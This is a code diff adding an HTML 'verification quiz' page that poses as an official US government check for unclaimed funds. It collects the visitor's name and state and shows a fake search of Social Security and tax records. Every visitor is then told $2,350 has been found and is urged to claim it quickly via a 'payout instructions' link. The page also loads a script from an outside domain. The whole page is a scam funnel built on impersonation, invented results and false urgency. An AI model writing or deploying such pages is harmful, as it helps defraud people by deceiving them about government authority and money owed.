@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official Check - Verification Quiz</title>
+    <link rel="stylesheet" href="/src/styles/main.css">
+    <link rel="stylesheet" href="/src/styles/components.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://go.lookupfunds.online/assets/easyt.js" async></script>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href="/" class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-flag-usa"></i>
+                </div>
+                USA <span>System</span>
+            </a>
+        </div>
+    </header>
+
+    <div class="official-bar">
+        <div class="container">
+            "Official check: priority verification portal — response in 10s"
+        </div>
+    </div>
+
+    <main class="container section" style="max-width: 600px;">
+        <div class="stepper">
+            <div class="step active" id="step-dot-1">
+                <div class="step-circle">1</div>
+                <span>Data</span>
+            </div>
+            <div class="step" id="step-dot-2">
+                <div class="step-circle">2</div>
+                <span>Verify</span>
+            </div>
+            <div class="step" id="step-dot-3">
+                <div class="step-circle">3</div>
+                <span>Result</span>
+            </div>
+        </div>
+
+        <form id="quiz-form" class="glass-card animate-fade-in" onsubmit="handleSteps(event)">
+            <!-- Step 1: Personal Data -->
+            <div id="step-1">
+                <h2 style="margin-bottom: 1.5rem; color: var(--primary);">Claimant Information</h2>
+                <div class="form-group">
+                    <label for="name">Full Name</label>
+                    <input type="text" id="name" class="form-input" placeholder="Enter your full name" required>
+                </div>
+                <div class="form-group">
+                    <label for="state">State</label>
+                    <select id="state" class="form-input" required>
+                        <option value="">Select your state</option>
+                        <option value="AL">Alabama</option>
+                        <option value="AK">Alaska</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="AR">Arkansas</option>
+                        <option value="CA">California</option>
+                        <option value="CO">Colorado</option>
+                        <option value="CT">Connecticut</option>
+                        <option value="DE">Delaware</option>
+                        <option value="DC">District of Columbia</option>
+                        <option value="FL">Florida</option>
+                        <option value="GA">Georgia</option>
+                        <option value="HI">Hawaii</option>
+                        <option value="ID">Idaho</option>
+                        <option value="IL">Illinois</option>
+                        <option value="IN">Indiana</option>
+                        <option value="IA">Iowa</option>
+                        <option value="KS">Kansas</option>
+                        <option value="KY">Kentucky</option>
+                        <option value="LA">Louisiana</option>
+                        <option value="ME">Maine</option>
+                        <option value="MD">Maryland</option>
+                        <option value="MA">Massachusetts</option>
+                        <option value="MI">Michigan</option>
+                        <option value="MN">Minnesota</option>
+                        <option value="MS">Mississippi</option>
+                        <option value="MO">Missouri</option>
+                        <option value="MT">Montana</option>
+                        <option value="NE">Nebraska</option>
+                        <option value="NV">Nevada</option>
+                        <option value="NH">New Hampshire</option>
+                        <option value="NJ">New Jersey</option>
+                        <option value="NM">New Mexico</option>
+                        <option value="NY">New York</option>
+                        <option value="NC">North Carolina</option>
+                        <option value="ND">North Dakota</option>
+                        <option value="OH">Ohio</option>
+                        <option value="OK">Oklahoma</option>
+                        <option value="OR">Oregon</option>
+                        <option value="PA">Pennsylvania</option>
+                        <option value="RI">Rhode Island</option>
+                        <option value="SC">South Carolina</option>
+                        <option value="SD">South Dakota</option>
+                        <option value="TN">Tennessee</option>
+                        <option value="TX">Texas</option>
+                        <option value="UT">Utah</option>
+                        <option value="VT">Vermont</option>
+                        <option value="VA">Virginia</option>
+                        <option value="WA">Washington</option>
+                        <option value="WV">West Virginia</option>
+                        <option value="WI">Wisconsin</option>
+                        <option value="WY">Wyoming</option>
+                    </select>
+                </div>
+                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 2rem; font-size: 0.9rem; color: var(--text-muted);">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms" style="margin: 0;">I authorize verification in federal database.</label>
+                </div>
+                <button type="submit" class="btn-cta" style="width: 100%;">Verify Now</button>
+            </div>
+
+            <!-- Step 2: Verification Loading -->
+            <div id="step-2" class="hidden text-center">
+                <h2 style="margin-bottom: 1rem; color: var(--primary);">Analyzing Public Records...</h2>
+                <div style="font-size: 3rem; color: var(--secondary); margin-bottom: 1.5rem;">
+                    <i class="fas fa-database fa-beat"></i>
+                </div>
+                <div class="progress-bar">
+                    <div id="loading-progress" class="progress-fill" style="width: 0%; transition: width 0.1s linear;"></div>
+                </div>
+                <p id="loading-status" style="font-weight: 600; color: var(--secondary);">Connecting to Federal API...</p>
+                <div style="margin-top: 2rem; text-align: left; font-size: 0.85rem; color: var(--text-muted); background: var(--surface-light); padding: 1rem; border-radius: 4px;">
+                    <p id="log-1" class="hidden"><i class="fas fa-check"></i> SSL Connection established...</p>
+                    <p id="log-2" class="hidden"><i class="fas fa-check"></i> Searching for claimant in Social Security database...</p>
+                    <p id="log-3" class="hidden"><i class="fas fa-check"></i> 1 match found for unclaimed restitutions!</p>
+                </div>
+            </div>
+
+            <!-- Step 3: Result -->
+            <div id="step-3" class="hidden text-center">
+                <h2 style="color: #059669; margin-bottom: 1rem;">
+                    <i class="fas fa-check-circle"></i> Funds Located!
+                </h2>
+                <div style="background: var(--surface-light); padding: 2rem; border-radius: 8px; margin-bottom: 2rem;">
+                    <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 0.5rem;">Estimated Amount Available:</p>
+                    <h1 style="font-size: 3rem; color: var(--primary);">$2,350.00</h1>
+                </div>
+                <p style="margin-bottom: 2rem; font-size: 0.95rem;">Please secure your claim instructions in the next page. Payouts are first-come, first-served.</p>
+                <a href="/pvn.html" class="btn-cta easyt-next-page" style="width: 100%;">Secure My Payout Instructions</a>
+            </div>
+        </form>
+    </main>
+
+    <footer class="container section text-center" style="border-top: 1px solid var(--border); opacity: 0.6; font-size: 0.8rem;">
+        <p>&copy; 2024 USA System. Access to information is governed by FOIA policies.</p>
+    </footer>
+
+    <script>
+        function handleSteps(e) {
+            e.preventDefault();
+            
+            // Mudar para o Step 2 (Loading)
+            // Salvar dados no localStorage
+            const fullName = document.getElementById('name').value;
+            const firstName = fullName.split(' ')[0];
+            const state = document.getElementById('state').value;
+            localStorage.setItem('userFullName', fullName);
+            localStorage.setItem('userFirstName', firstName);
+            localStorage.setItem('userState', state);
+
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            document.getElementById('step-dot-1').classList.replace('active', 'completed');
+            document.getElementById('step-dot-2').classList.add('active');
+
+            let progress = 0;
+            const bar = document.getElementById('loading-progress');
+            const status = document.getElementById('loading-status');
+
+            const interval = setInterval(() => {
+                progress += 1;
+                bar.style.width = progress + '%';
+
+                if (progress === 20) {
+                    status.innerText = "Scanning Social Security Records...";
+                    document.getElementById('log-1').classList.remove('hidden');
+                }
+                if (progress === 50) {
+                    status.innerText = "Checking Tax Compliance Refunds...";
+                    document.getElementById('log-2').classList.remove('hidden');
+                }
+                if (progress === 80) {
+                    status.innerText = "Finalizing calculations...";
+                    document.getElementById('log-3').classList.remove('hidden');
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        // Ir para o Step 3 (Resultado)
+                        document.getElementById('step-2').classList.add('hidden');
+                        document.getElementById('step-3').classList.remove('hidden');
+                        document.getElementById('step-dot-2').classList.replace('active', 'completed');
+                        document.getElementById('step-dot-3').classList.add('active');
+                    }, 500);
+                }
+            }, 50);
+        }
+    </script>
+</body>
+</html>
